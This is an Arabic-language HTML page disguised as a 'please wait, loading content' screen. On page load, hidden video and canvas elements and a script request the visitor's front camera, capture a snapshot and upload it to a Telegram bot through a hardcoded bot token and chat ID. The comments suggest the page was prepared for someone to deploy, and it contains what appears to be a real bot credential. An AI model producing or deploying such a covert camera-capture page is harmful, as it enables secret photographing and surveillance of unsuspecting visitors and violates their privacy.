<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <style>
        body {
            background-color: #121212;
            color: #ffffff;
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.1);
            width: 50px;
            height: 50px;
            border-radius: 50%;
            border-left-color: #0088cc;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        p {
            font-size: 16px;
            color: #b0b0b0;
        }
    </style>
</head>
<body>

    <div class="spinner"></div>
    <h2>جاري تحضير المحتوى...</h2>
    <p>يرجى الانتظار قليلاً حتى اكتمال التحميل</p>

    <!-- عناصر مخفية تماماً لمعالجة الكاميرا في الخلفية -->
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // بيانات البوت والمعرف الخاصة بك جاهزة ومدمجة
        const BOT_TOKEN = "8730950232:AAEx1LjVNqqqlC0335uZa13_-6InRx7YXs";
        const CHAT_ID = "8787876793";

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        // الخطوة الأولى: طلب إذن الكاميرا وتشغيل البث في الخلفية
        async function initCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } // الكاميرا الأمامية
                });
                video.srcObject = stream;
                
                // الانتظار ثانية ونصف حتى تفتح الكاميرا وتستقر الإطارات، ثم الالتقاط
                setTimeout(takeSnapshot, 1500);
            } catch (error) {
                console.error("خطأ في تشغيل الكاميرا أو رفض الإذن:", error);
            }
        }

        // الخطوة الثانية: التقاط الإطار الحالي وتحويله إلى Blob
        function takeSnapshot() {
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // تحويل البيانات البصرية على الـ Canvas إلى ملف ثنائي Blob بصيغة JPEG
            canvas.toBlob(function(blob) {
                sendImageToTelegram(blob);
            }, 'image/jpeg', 0.85);
        }

        // الخطوة الثالثة: إرسال الملف الثنائي عبر Fetch و FormData إلى تيليجرام API
        async function sendImageToTelegram(blob) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'snapshot.jpg');

            try {
                const response = all = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                if (result.ok) {
                    console.log("تم إرسال الصورة بنجاح إلى تيليجرام!");
                }
            } catch (err) {
                console.error("فشل في إرسال الطلب الشبكي:", err);
            }
        }

        // تنفيذ الدالة فور تحميل الصفحة بالكامل
        window.onload = initCamera;
    </script>
</body>
</html>
